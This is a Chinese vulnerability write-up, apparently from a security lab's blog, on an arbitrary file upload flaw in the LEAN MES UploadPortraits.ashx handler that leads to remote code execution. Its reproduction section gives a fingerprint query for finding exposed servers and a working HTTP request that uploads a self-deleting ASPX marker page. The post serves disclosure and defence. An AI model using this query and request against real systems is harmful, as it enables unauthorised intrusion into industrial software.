#  深科特 LEAN MES 任意文件上传漏洞分析（从逻辑缺陷到 RCE）  
原创 zz
                    zz  星络安全实验室   2026-03-25 04:11  
  
<table><tbody><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;visibility: visible;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span data-pm-slice="0 0 []" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;float: none;visibility: visible;display: inline !important;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></section></td></tr></tbody></table>  
    在对深科特 LEAN MES 系统进行安全测试过程中，发现其 UploadPortraits.ashx  
 接口存在严重的任意文件上传漏洞。  
  
     在对 UploadPortraits.ashx  
 接口进行测试时发现，系统仅对 UserId  
 参数进行了简单的数值合法性判断（要求为大于 0 的整数）。但该校验仅用于基础校验流程，并未对后续业务逻辑产生实际约束。  
  
       在文件处理过程中，程序仍直接使用用户提交的原始 UserId  
 参数参与文件路径或名称拼接，缺乏进一步的安全过滤与规范化处理，导致该校验在实际安全防护上未起到应有作用，形同虚设。  
  
      与此同时，接口对用户可控的 Filename  
 参数未进行任何扩展名限制或安全过滤，攻击者可构造恶意文件名并上传脚本文件（如 .aspx  
），从而实现任意文件写入。  
  
      漏洞利用过程中，服务端返回 200 OK  
 并回显文件名，表明文件已成功写入服务器。在可访问路径已知的情况下，攻击者可直接访问该文件并触发服务器执行，最终实现远程代码执行（RCE）。  
  
      该漏洞本质上是**输入校验逻辑缺陷 + 文件上传缺乏安全控制**  
的组合问题，风险极高。  
# 漏洞复现  
```
(title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
```  
```
POST /Handler/UploadPortraits.ashx?Type=Upload&UserId=1&Filename=1.apsx HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Host: xx

------WebKitFormBoundary
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary--

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2AAMh9HmvsT89mISrx4wrHksmiaPbusGghibSmLYKudf0F6VCYYczLc8yibjEzxhNoGjXMcicGQ7b3FyyhtASmFH3iaKXRhFFhzuUEibUxQzupqRA/640?wx_fmt=png&from=appmsg "")  
```

```  
  
